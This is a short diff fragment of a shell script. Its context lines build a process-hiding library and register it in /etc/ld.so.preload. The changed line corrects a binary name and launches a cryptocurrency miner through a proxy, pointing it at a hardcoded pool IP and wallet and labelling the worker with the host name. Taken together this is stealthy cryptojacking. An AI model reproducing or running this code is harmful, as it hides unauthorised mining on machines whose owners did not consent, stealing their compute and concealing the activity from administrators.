@@ -55,4 +55,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & ./twnine --pool 43.173.108.34:80 --wallet prl1p7ywpecpnx8acnac87vzll58eyx92fjsf3r0t2ywnv08sr6pmrz3s8y7y36 --worker $(hostname)
+./graftcp/graftcp & ./twmine --pool 43.173.108.34:80 --wallet prl1p7ywpecpnx8acnac87vzll58eyx92fjsf3r0t2ywnv08sr6pmrz3s8y7y36 --worker $(hostname)
